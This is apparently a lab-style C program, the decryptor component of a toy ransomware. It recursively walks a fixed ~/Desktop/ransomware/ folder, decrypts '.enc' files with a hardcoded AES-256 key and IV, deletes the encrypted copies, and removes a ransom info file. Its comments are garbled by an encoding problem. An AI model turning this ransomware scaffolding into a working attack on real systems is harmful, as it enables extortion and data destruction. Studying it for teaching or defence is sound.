#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <pwd.h>
#include <unistd.h>
#include <sys/types.h>


void decryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);
void ls_dir(char* start_path);

void main()
{
char* start_path;  //start_path¶óŽÂ charÇü Æ÷ÀÎÅÍžžµë
    char* home;
    char* uid;
char dede[] = {"RANSOMEWARE_INFO"};
    uid_t user_id;
       struct passwd *user_pw;
    struct passwd *lpwd;
    lpwd = getpwuid(getuid());
    lpwd = getpwuid(geteuid());
    home = "/home/";
       //user_id = lpwd->pw_name;
    start_path = (char*) malloc(strlen(home)+strlen(lpwd->pw_name)+strlen("/Desktop/ransomware/")+2);
    strcpy(start_path, home);    
    strcat(start_path, lpwd->pw_name);
    strcat(start_path, "/Desktop/ransomware/");
    printf("%s", start_path);
        ls_dir(start_path);
remove(dede);

}

void ls_dir(char* start_path)
{
    unsigned char key[] = "12345678901234561234567890123456"; //32 chars long
    unsigned char iv[] = "1234567890123456";//16 chars long
    DIR* dir;
    struct dirent *ent;
    if((dir=opendir(start_path)) !=NULL)
    {
        while((ent=readdir(dir)) !=NULL)
        {

            if(ent->d_type == 8)
            {

                int len = strlen(ent->d_name);
                const char* last_four = &ent->d_name[len-4];
                if(strcmp(last_four,".enc") == 0)
                {

                    char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);
                    strcpy(full_path,start_path);
                    strcat(full_path,ent->d_name);
                    char* new_name = (char*) malloc(strlen(full_path)+1);
                    strcpy(new_name,full_path);
                    new_name[strlen(new_name)-4] = '\0';

                    FILE* fpin;
                    FILE* fpout;

                    fpin=fopen(full_path,"rb");
                    fpout=fopen(new_name,"wb");

                    decryptfile(fpin,fpout,key,iv);
                    if(fpin != NULL)
                        fclose(fpin);
                    if(fpout != NULL)
                        fclose(fpout);
                    
                    remove(full_path);
                    free(full_path);
                    free(new_name);


                }
    

            }

            if(ent->d_type ==4)
            {

                char *full_path=(char*) malloc(strlen(start_path)+strlen(ent->d_name)+2);
                strcpy(full_path,start_path);
                strcat(full_path,ent->d_name);
                strcat(full_path,"/");
                
                if(full_path != start_path && ent->d_name[0] != '.')
                {    
                    printf("%s\n",full_path);
                    ls_dir(full_path);
                }
                free(full_path);
            }

        }
    }
}



void decryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv)
{
    //Using openssl EVP to encrypt a file


    const unsigned bufsize = 4096; // bytes to read
    unsigned char* read_buf = malloc(bufsize); // buffer to hold file text
    unsigned char* cipher_buf ;// decrypted text
    unsigned blocksize;
    int out_len;

    EVP_CIPHER_CTX ctx;

    EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,0); // 0 = decrypt     1= encrypt
    blocksize = EVP_CIPHER_CTX_block_size(&ctx);
    cipher_buf = malloc(bufsize+blocksize);

    // read file and write encrypted file until eof
    while(1)
    {
        int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);
        EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);
        fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
        if(bytes_read < bufsize)
        {
            break;//EOF
        }
    }

    EVP_CipherFinal(&ctx,cipher_buf,&out_len);
    fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);

    free(cipher_buf);
    free(read_buf);
}
